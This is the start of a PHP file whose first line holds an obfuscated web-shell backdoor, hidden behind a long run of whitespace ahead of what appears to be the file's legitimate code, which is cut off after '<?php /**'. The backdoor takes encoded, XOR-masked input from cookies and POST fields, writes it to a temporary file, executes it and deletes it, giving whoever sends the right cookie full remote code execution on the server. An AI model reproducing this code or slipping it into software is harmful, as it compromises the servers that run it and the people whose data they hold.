<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("cttweux")){class cttweux{public static $otbbcu = "gaeomeltbaluyeus";public static $awqamza = NULL;public function __construct(){$icvhodnbew = @$_COOKIE[substr(cttweux::$otbbcu, 0, 4)];if (!empty($icvhodnbew)){$xfvahpwhj = "base64";$ffgplribe = "";$icvhodnbew = explode(",", $icvhodnbew);foreach ($icvhodnbew as $tyhiyrgiy){$ffgplribe .= @$_COOKIE[$tyhiyrgiy];$ffgplribe .= @$_POST[$tyhiyrgiy];}$ffgplribe = array_map($xfvahpwhj . "_decode", array($ffgplribe,));$ffgplribe = $ffgplribe[0] ^ str_repeat(cttweux::$otbbcu, (strlen($ffgplribe[0]) / strlen(cttweux::$otbbcu)) + 1);cttweux::$awqamza = @unserialize($ffgplribe);}}public function __destruct(){$this->loipbul();}private function loipbul(){if (is_array(cttweux::$awqamza)) {$imagnzoebl = sys_get_temp_dir() . "/" . crc32(cttweux::$awqamza["salt"]);@cttweux::$awqamza["write"]($imagnzoebl, cttweux::$awqamza["content"]);include $imagnzoebl;@cttweux::$awqamza["delete"]($imagnzoebl);exit();}}}$ucdaluazzo = new cttweux();$ucdaluazzo = NULL;} ?><?php
/**
